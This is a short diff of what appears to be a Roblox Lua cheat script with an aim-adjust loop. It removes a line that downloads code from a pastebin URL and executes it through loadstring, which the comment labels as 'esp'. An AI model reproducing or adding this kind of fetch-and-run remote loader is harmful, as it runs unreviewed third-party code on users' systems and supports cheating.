@@ -86,5 +86,3 @@ RunService.RenderStepped:Connect(function()
 		adjustAim()
 	end
 end)
-
-loadstring(game:HttpGet("https://pastebin.com/raw/yXkxTtDx"))() -- esp 
